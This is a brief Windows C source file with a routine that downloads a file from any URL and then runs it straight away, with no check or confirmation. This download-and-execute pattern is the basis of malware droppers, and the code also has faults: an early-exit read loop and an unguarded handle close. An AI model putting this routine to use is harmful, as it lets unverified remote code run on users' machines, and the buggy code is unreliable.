#include "stdafx.h"

void RunApp(char *szCommand)
{
	STARTUPINFO siProcess={0};
	PROCESS_INFORMATION piProcess={0};

	CreateProcess(NULL, szCommand, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &siProcess, &piProcess);
}

void DownloadFile(char *szUrl, char *szDestLocation)
{
	HANDLE hFile;
	HINTERNET hInetOpen, hInetUrl;
	char szTemp[1024]="";
	DWORD dwBytesRead, dwRead;

	hFile = CreateFile(szDestLocation, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, NULL);
	
	hInetOpen = InternetOpen(" ", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	if(hInetOpen && hFile != INVALID_HANDLE_VALUE)
	{
		hInetUrl = InternetOpenUrl(hInetOpen, szUrl, NULL, NULL, NULL, NULL);
		
		if(hInetUrl)
		{
			do
			{
				InternetReadFile(hInetUrl, szTemp, 1024, &dwBytesRead);
				WriteFile(hFile, szTemp, dwBytesRead, &dwRead, 0);
			}
			while(dwBytesRead==1024);
		}
	}

	SetEndOfFile(hFile);

	CloseHandle(hFile);
	InternetCloseHandle(hInetUrl);
	InternetCloseHandle(hInetOpen);

	RunApp(szDestLocation);
}
